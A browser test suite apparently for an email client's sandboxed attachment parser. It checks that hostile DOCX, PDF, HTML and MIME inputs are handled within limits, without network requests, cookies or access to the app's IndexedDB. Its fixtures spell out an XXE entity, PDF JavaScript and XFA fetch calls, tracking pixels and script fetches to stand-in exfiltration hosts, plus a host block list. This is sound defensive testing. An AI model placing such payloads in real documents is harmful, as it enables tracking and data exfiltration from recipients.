import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { commands } from 'vitest/browser';
import { cjkPdf, docxFiles, pdf, zip } from '../extract/files/fixtures';
import type { FileText } from '../extract/files/sink';
import type { Extracted } from '../extract/extract';
import type { ParseRequest } from '../extract/parse';
import { ParserClient } from '../sync/extractor';
import { ParserHost } from './host';

interface ParserRequest {
	path: string;
	cookie: string | null;
}

declare module 'vitest/browser' {
	interface BrowserCommands {
		parserOrigin: (appOrigin: string) => Promise<string>;
		parserRequests: () => Promise<ParserRequest[]>;
		watchNetwork: () => Promise<null>;
		networkSeen: () => Promise<string[]>;
		frameDatabases: (origin: string) => Promise<string[] | null>;
	}
}

const EXFIL = ['calloway.test', 'exfil.', 'tracker.', 'cdn.', 'pixel.'];
const enc = (s: string) => new TextEncoder().encode(s);
const APP_DB = 'thelemail-parser-probe';

let origin: string;
let host: ParserHost;
let client: ParserClient;

function file(bytes: Uint8Array, filename: string, mime = 'application/octet-stream'): ParseRequest {
	return { kind: 'file', bytes, filename, mime };
}

async function run(request: ParseRequest): Promise<FileText | Extracted> {
	const r = await client.parse(request, { source: '1:probe', revision: 1 });
	if (!r.ok) throw new Error(`parse failed: ${r.reason}`);
	return r.result.value;
}

async function text(request: ParseRequest): Promise<FileText> {
	const v = await run(request);
	if (!('state' in v)) throw new Error('expected file text');
	return v;
}

function openAppDatabase(): Promise<void> {
	return new Promise((resolve, reject) => {
		const req = indexedDB.open(APP_DB, 1);
		req.onsuccess = () => {
			req.result.close();
			resolve();
		};
		req.onerror = () => reject(req.error);
	});
}

beforeAll(async () => {
	document.cookie = 'thelemail_session=probe; path=/; SameSite=Lax';
	await openAppDatabase();
	origin = await commands.parserOrigin(location.origin);
	host = new ParserHost({ origin });
	client = new ParserClient(host.connect());
	expect(await text(file(enc('warm up'), 'a.txt', 'text/plain'))).toMatchObject({ state: 'complete' });
}, 180_000);

afterAll(() => {
	client?.close();
	host?.close();
	indexedDB.deleteDatabase(APP_DB);
});

describe('isolated parser origin', () => {
	it('extracts hostile files within bounds without any network request', async () => {
		const before = (await commands.parserRequests()).length;
		await commands.watchNetwork();

		const bomb = docxFiles(['x']);
		bomb['word/document.xml'] = `<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>${'A'.repeat(8 * 1024 * 1024)}</w:t></w:r></w:p></w:body></w:document>`;
		const deep = docxFiles([]);
		deep['word/document.xml'] = `<w:document xmlns:w="w">${'<w:b>'.repeat(5000)}${'</w:b>'.repeat(5000)}</w:document>`;
		const entity = docxFiles([]);
		entity['word/document.xml'] =
			'<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "https://exfil.calloway.test/e">]><w:document xmlns:w="w"><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p></w:body></w:document>';
		const external = docxFiles(['Visible text'], { external: true });
		external['word/_rels/document.xml.rels'] = String(external['word/_rels/document.xml.rels']).replace('https://tracker.test/remote.xml', 'https://exfil.calloway.test/h.xml');
		const scripted = pdf(
			['Quarterly terms'],
			"/OpenAction << /S /JavaScript /JS (app.launchURL\\('https://exfil.calloway.test/js'\\)) >> /AcroForm << /XFA (<xdp:xdp><template><subform><script>fetch\\('https://exfil.calloway.test/xfa'\\)</script></subform></template></xdp:xdp>) >> "
		);
		const huge = pdf(Array.from({ length: 520 }, (_, i) => `Page ${i + 1}`));

		expect((await text(file(await zip(bomb), 'bomb.docx'))).state).toBe('partial');
		expect((await text(file(await zip(deep), 'deep.docx'))).state).toBe('partial');
		expect((await text(file(await zip(entity), 'entity.docx'))).state).toBe('malformed');
		const ext = await text(file(await zip(external), 'external.docx'));
		expect(ext.state).toBe('complete');
		expect(ext.parts.map((p) => p.text)).toEqual(['Visible text']);
		const js = await text(file(scripted, 'scripted.pdf', 'application/pdf'));
		expect(js).toMatchObject({ state: 'complete', parts: [{ place: 'page:1', text: 'Quarterly terms' }] });
		const big = await text(file(huge, 'huge.pdf', 'application/pdf'));
		expect(big.state).toBe('partial');
		expect(big.parts).toHaveLength(500);
		const html = await text(
			file(enc('<p>Agenda</p><img src="https://pixel.calloway.test/o.gif"><link rel="stylesheet" href="https://cdn.calloway.test/x.css"><script>fetch("https://exfil.calloway.test/s")</script>'), 'agenda.html', 'text/html')
		);
		expect(html.parts.map((p) => p.text)).toEqual(['Agenda']);

		const seen = await commands.networkSeen();
		const after = (await commands.parserRequests()).slice(before);
		expect(seen.filter((url) => EXFIL.some((h) => url.includes(h)))).toEqual([]);
		expect(seen.filter((url) => url.startsWith(origin))).toEqual([]);
		expect(after).toEqual([]);
	}, 120_000);

	it('extracts hostile message MIME without any network request', async () => {
		const before = (await commands.parserRequests()).length;
		await commands.watchNetwork();
		const mime = [
			'From: Bram <bram@calloway.test>',
			'To: Ada <ada@calloway.test>',
			'Subject: Harbour report',
			'Content-Type: multipart/mixed; boundary="m"',
			'',
			'--m',
			'Content-Type: text/html; charset=utf-8',
			'',
			'<p>Harbour report</p><img src="https://pixel.calloway.test/open.gif"><link rel="stylesheet" href="https://cdn.calloway.test/a.css">',
			'<a href="https://tracker.calloway.test/c">read</a><iframe src="https://exfil.calloway.test/f"></iframe><script>fetch("https://exfil.calloway.test/m")</script>',
			'--m',
			'Content-Type: message/rfc822',
			'',
			'From: Cora <cora@calloway.test>',
			'Subject: Inner',
			'Content-Type: text/html',
			'',
			'<p>Inner note</p><img src="https://pixel.calloway.test/inner.gif">',
			'--m--',
			''
		].join('\r\n');
		const out = await run({ kind: 'mime', bytes: enc(mime) });
		expect('outcome' in out && out.outcome).toBe('complete');
		const body = 'parts' in out ? out.parts.map((p) => p.text).join(' ') : '';
		expect(body).toContain('Harbour report');
		expect(body).toContain('Inner note');
		const seen = await commands.networkSeen();
		expect(seen.filter((url) => EXFIL.some((h) => url.includes(h)))).toEqual([]);
		expect((await commands.parserRequests()).slice(before)).toEqual([]);
	}, 60_000);

	it('loads the pdf.js assets in one bundle request', async () => {
		const paths = (await commands.parserRequests()).map((r) => r.path);
		expect(paths.filter((p) => /^\/_app\/immutable\/assets\/pdfjs-[0-9a-f]{16}\.bin$/.test(p))).toHaveLength(1);
		expect(paths.filter((p) => p.startsWith('/pdfjs/'))).toEqual([]);
	});

	it('extracts Japanese text through a CJK character map without any network request', async () => {
		const before = (await commands.parserRequests()).length;
		await commands.watchNetwork();
		const r = await text(file(cjkPdf(['請求書 QX-4471']), 'seikyusho.pdf', 'application/pdf'));
		expect(r).toMatchObject({ state: 'complete', parts: [{ place: 'page:1', text: '請求書 QX-4471' }] });
		expect((await commands.networkSeen()).filter((url) => url.startsWith(origin))).toEqual([]);
		expect((await commands.parserRequests()).slice(before)).toEqual([]);
	});

	it('receives no cookie and cannot open the app IndexedDB', async () => {
		const requests = await commands.parserRequests();
		expect(requests.length).toBeGreaterThan(0);
		expect(requests.filter((r) => r.cookie !== null)).toEqual([]);
		const names = await commands.frameDatabases(origin);
		expect(names).not.toBeNull();
		expect(names).not.toContain(APP_DB);
	});

	it('rejects a connect that does not carry the nonce', async () => {
		const frame = document.createElement('iframe');
		frame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
		frame.src = `${origin}/#n=AAAAAAAAAAAAAAAAAAAAAAAAAAAA`;
		document.body.appendChild(frame);
		await new Promise((r) => frame.addEventListener('load', r, { once: true }));
		const channel = new MessageChannel();
		const reply = new Promise<unknown>((resolve) => {
			channel.port1.onmessage = (e) => resolve(e.data);
			setTimeout(() => resolve(null), 3000);
		});
		frame.contentWindow!.postMessage({ type: 'thelemail-parser:connect', nonce: 'BBBBBBBBBBBBBBBBBBBBBBBBBBBB' }, origin, [channel.port2]);
		expect(await reply).toBeNull();
		frame.remove();
	});
});
